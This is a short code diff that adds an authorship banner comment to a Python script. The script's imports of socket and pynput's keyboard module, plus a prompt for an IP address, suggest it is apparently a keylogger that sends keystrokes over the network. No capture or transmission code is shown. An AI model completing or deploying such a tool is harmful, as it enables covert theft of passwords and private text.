@@ -1,3 +1,9 @@
+# *****************************************
+# *                                       *
+# *   Created by   V A M S I              *
+# *                                       *
+# *****************************************
+
 import socket 
 from pynput import keyboard
 ip = input("enter a ip address:")
